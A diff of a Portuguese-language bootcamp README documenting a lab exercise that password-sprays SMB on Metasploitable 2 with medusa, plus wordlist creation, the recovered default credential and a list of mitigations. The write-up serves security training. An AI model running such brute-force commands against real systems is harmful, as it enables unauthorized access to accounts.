@@ -1,3 +1,4 @@
+```markdown
 # Desafio de Projeto DIO: Simulação de Ataques de Força Bruta e Medidas de Prevenção
 
 Projeto prático desenvolvido para o bootcamp de cibersegurança, utilizando **Kali Linux** e ambientes vulneráveis (**Metasploitable 2** e **DVWA**) em ambiente controlado via VirtualBox.
@@ -30,3 +31,35 @@ Projeto prático desenvolvido para o bootcamp de cibersegurança, utilizando **K
   ```bash
   echo -e "user\nmsfadmin\nservice" > smb_users.txt
   echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
+
+```
+
+* **Comando Executado:**
+```bash
+medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
+
+```
+
+* **Resultado:**
+* Credencial encontrada: `msfadmin` / `msfadmin`
+* **Privilégio:** Acesso permitido ao share administrativo (`ADMIN$ - Access Allowed`).
+
+---
+
+## 🛡️ Medidas de Mitigação e Recomendações
+
+1. **Políticas de Senhas Fortes:** Eliminar o uso de senhas fracas e padronizadas (como `msfadmin/msfadmin`), exigindo complexidade e tamanho mínimo.
+2. **Hardening de Serviços:** Desativar protocolos legados e inseguros (como SMBv1 e FTP sem criptografia).
+3. **Monitoramento e Limitação de Tentativas:** Implementar bloqueio automático de IPs ou contas após múltiplas falhas de autenticação para mitigar ataques de força bruta e password spraying.
+4. **Controle de Acesso:** Aplicar estritamente o Princípio do Menor Privilégio nas permissões de compartilhamentos de rede e pastas administrativas.
+
+---
+
+## 📂 Arquivos do Repositório
+
+* `users.txt` / `smb_users.txt` — Wordlists de usuários.
+* `pass.txt` / `senhas_spray.txt` — Wordlists de senhas.
+* `enum4linux.txt` — Log completo da enumeração SMB.
+* `/images` — Capturas de tela dos testes realizados.
+
+```
